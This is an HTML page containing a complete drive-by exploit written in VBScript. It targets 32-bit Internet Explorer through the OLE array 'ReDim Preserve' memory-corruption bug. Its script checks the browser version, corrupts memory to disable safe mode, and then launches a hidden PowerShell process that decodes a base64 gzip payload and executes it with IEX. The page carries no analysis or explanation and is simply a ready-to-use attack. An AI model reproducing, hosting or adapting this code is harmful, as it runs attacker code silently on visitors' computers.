<!doctype html>
<html>
<meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" >
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<body>
<script language="VBScript">
function runaaaa()
On Error Resume Next
set shell=createobject("Shell.Application")
shell.ShellExecute "powershell.exe", "-nop -w hidden -c if([IntPtr]::Size -eq 4){$b='powershell.exe'}else{$b=$env:windir+'\syswow64\WindowsPowerShell\v1.0\powershell.exe'};$s=New-Object System.Diagnostics.ProcessStartInfo;$s.FileName=$b;$s.Arguments='-nop -w hidden -c $s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(''H4sIAGEaAVUCA7VW+2/aSBD+OZX6P1gVkm3VoTxCkkaqdEB4FWx8NYQARafFXpulaxv24YT0+r/fGOyGXpoqPekQEvuY2fnmm29n8WXkChJHCsLnwUz5+vrViY0YChWtsEIy7IeJoRSI3Cab2oqOg0min5yATSHuyunGvvT7jffKB0Wb1zeb6zhEJFpcXTUlYzgSh3mxg0WdcxwuKcFc05W/lckKM3w6XK6xK5SvSuGvYofGS0Qzs10TuSusnNYjL90bxC5KERadDSVCUz9/VvX5aXlRbG0lolxTnR0XOCx6lKq68k1PA452G6ypJnFZzGNfFCckqlaK44gjH1twWoJNLFaxx1UdkoEvw0KySDlOKz3nYKWpMLRZ7NY9j2EOTsVelMRfsFaIJKWG8oc2z0B8kpEgIYZ9gVm8cTBLiIt5sYsij+JP2F9oFr7Lc3+pk3bsBFa2YLoBFXoerRl7kuLDAar+FG9eXB0+/y4wUPLt9avXr/xcGtG6Itak24+P5QGjk/l+jAG1Zsec7I0/KCVDMSEwEjHbwbQwYhLrC2WeFmW+WCgF3hp1rIrx/Anl3ByM/Zn9sLrx7Qmsz29i4i3AL6taYX1b7j+kG8/L7xr7JMLXuwiFxM0Vpv2sCtineJ9wMTezAJqmZhvYu8YUB0ikhBrK/KlbKyTiu29DEuphVnehkhxQQZH1H8EcaqSpvcjEIXB1mKtQDh90jXPrTMu7PHo6ByO1SRHnhmJLuFiuoTgYUewZSj3iJNuqSxHvh+ojXFNSQVzERX7cQv9OZBawGUdcMOlC/SD5kbPBLkE05cJQusTDjZ1Dgjyw+lMmmohSEgVwUgKVgJWUAUekqmCAMVOAXnSw6IUbikOw2l/yNkUBXOnsRuyFhALsqU9A5lo/CDvlIyfiCCIU2aGxMJQbwgQ0iz23uZ7+K4yjbnEA1GQ4K4uWX515YydSrRf8pZym+swo2hPCBJDRZnHYQByfnzmCAVXamwofzLzmqCR33bNxqeabbnhvXrf9Tt3yOz07qX7ahjy5mTlj3rb5UFrd86qszIb87Xn/46yFOmP+dtBnYadusgkNmuy8Y9V6tc3d8PaWNsNqYA3dfn8iu+agbO/G1dG41arx6XQVBIPW9NJxGvez7YBtJ931Q+vdrG0Pp53Aj2e+n9Q2velZ0O01K7vBnaj7o7JjX1drvYBcmrTW99+xQMRe8mfCrKEcJZNafXJBp0m1v5xebGfkoXXh3/S38qx9M9t2LKtWLplB2STn1+1GP3J4KdqGdxfovS0fVmZwweLJsr+6RUnZm1jRW+9BXi4b8vJNSj6wX5CRdenh953wiNjnWqiJGF8hCoRDU8wl345ZO+ttdkxSD007PH9fMIswhacCHpNcNHVKYzdtt49tEPr9oQsvQP1jGFYrPx3pyndD/bEJ50tXVzPAmkoSRFIc4CgQK6N0Xy2VoIOW7s9KkPDL82vGm522P8pIO/AjS3kAug+gp/IsRL31/0xedilW8OO9iLzHtV/svojQknGU/JO9Hxd+i+LfZ2GCiABTBy44xYfn5hdkZKI5fq57a1CEn33S/05DKU4teMT/AahEz5K4CQAA''));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();';$s.UseShellExecute=$false;$p=[System.Diagnostics.Process]::Start($s);", "", "open", 0
end function
</script>
<script language="VBScript">

dim   aa()
dim   ab()
dim   a0
dim   a1
dim   a2
dim   a3
dim   win9x
dim   intVersion
dim   rnda
dim   funclass
dim   myarray

Begin()

function Begin()
  On Error Resume Next
  info=Navigator.UserAgent

  if(instr(info,"Win64")>0)   then
     exit   function
  end if

  if (instr(info,"MSIE")>0)   then
             intVersion = CInt(Mid(info, InStr(info, "MSIE") + 5, 2))
  else
     exit   function

  end if

  win9x=0

  BeginInit()
  If Create()=True Then
     myarray=        chrw(01)&chrw(2176)&chrw(01)&chrw(00)&chrw(00)&chrw(00)&chrw(00)&chrw(00)
     myarray=myarray&chrw(00)&chrw(32767)&chrw(00)&chrw(0)

     if(intVersion<4) then
         document.write("<br> IE")
         document.write(intVersion)
         runshellcode()
     else
          setnotsafemode()
     end if
  end if
end function

function BeginInit()
   Randomize()
   redim aa(5)
   redim ab(5)
   a0=13+17*rnd(6)
   a3=7+3*rnd(5)
end function

function Create()
  On Error Resume Next
  dim i
  Create=False
  For i = 0 To 400
    If Over()=True Then
    '   document.write(i)
       Create=True
       Exit For
    End If
  Next
end function

sub testaa()
end sub

function mydata()
    On Error Resume Next
     i=testaa
     i=null
     redim  Preserve aa(a2)

     ab(0)=0
     aa(a1)=i
     ab(0)=6.36598737437801E-314

     aa(a1+2)=myarray
     ab(2)=1.74088534731324E-310
     mydata=aa(a1)
     redim  Preserve aa(a0)
end function

function setnotsafemode()
    On Error Resume Next
    i=mydata()
    i=readmemo(i+8)
    i=readmemo(i+16)
    j=readmemo(i+&h134)
    for k=0 to &h60 step 4
        j=readmemo(i+&h120+k)
        if(j=14) then
              j=0
              redim  Preserve aa(a2)
     aa(a1+2)(i+&h11c+k)=ab(4)
              redim  Preserve aa(a0)

     j=0
              j=readmemo(i+&h120+k)

               Exit for
           end if

    next
    ab(2)=1.69759663316747E-313
    runaaaa()
end function

function Over()
    On Error Resume Next
    dim type1,type2,type3
    Over=False
    a0=a0+a3
    a1=a0+2
    a2=a0+&h8000000

    redim  Preserve aa(a0)
    redim   ab(a0)

    redim  Preserve aa(a2)

    type1=1
    ab(0)=1.123456789012345678901234567890
    aa(a0)=10

    If(IsObject(aa(a1-1)) = False) Then
       if(intVersion<4) then
           mem=cint(a0+1)*16
           j=vartype(aa(a1-1))
           if((j=mem+4) or (j*8=mem+8)) then
              if(vartype(aa(a1-1))<>0)  Then
                 If(IsObject(aa(a1)) = False ) Then
                   type1=VarType(aa(a1))
                 end if
              end if
           else
             redim  Preserve aa(a0)
             exit  function

           end if
        else
           if(vartype(aa(a1-1))<>0)  Then
              If(IsObject(aa(a1)) = False ) Then
                  type1=VarType(aa(a1))
              end if
            end if
        end if
    end if


    If(type1=&h2f66) Then
          Over=True
    End If
    If(type1=&hB9AD) Then
          Over=True
          win9x=1
    End If

    redim  Preserve aa(a0)

end function

function ReadMemo(add)
    On Error Resume Next
    redim  Preserve aa(a2)

    ab(0)=0
    aa(a1)=add+4
    ab(0)=1.69759663316747E-313
    ReadMemo=lenb(aa(a1))

    ab(0)=0

    redim  Preserve aa(a0)
end function

    
</script>
</body>
</html>
    
